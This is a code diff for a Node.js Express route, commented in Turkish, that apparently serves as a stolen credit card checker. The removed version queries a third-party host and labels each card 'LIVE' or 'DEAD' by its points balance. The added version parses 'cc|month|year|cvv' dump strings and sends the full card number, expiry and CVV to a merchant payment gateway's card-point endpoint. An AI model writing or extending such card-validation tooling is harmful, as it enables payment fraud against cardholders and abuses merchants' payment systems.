@@ -1,27 +1,25 @@
-import express from "express";
-import axios from "axios";
-
+const express = require("express");
 const router = express.Router();
+const axios = require("axios");
 
-router.get("/", async (req, res) => {
-  const kart = req.query.card;
-  if (!kart) {
-    return res.status(400).json({ error: "Kart numarası eksik" });
-  }
-
+router.post("/", async (req, res) => {
   try {
-    const response = await axios.get(`https://solwinsystemm.rf.gd/api.php?card=${kart}`);
-    const puan = response?.data?.data?.point ?? 0;
-    const status = puan > 0 ? "LIVE" : "DEAD";
+    const { card } = req.body;
 
-    res.json({
-      status,
-      puan,
-      etiket: "@HzQuarex"
-    });
-  } catch (err) {
-    res.status(500).json({ error: "Sunucu hatası", detay: err.message });
+    if (!card) {
+      return res.status(400).json({ error: "Kart bilgisi eksik" });
+    }
+
+    const [cc, month, year, cvv] = card.split("|");
+
+    const response = await axios.get(
+      `https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=45542`
+    );
+
+    res.json(response.data);
+  } catch (error) {
+    res.status(500).json({ error: "API isteği başarısız", detail: error.message });
   }
 });
 
-export default router;
+module.exports = router;
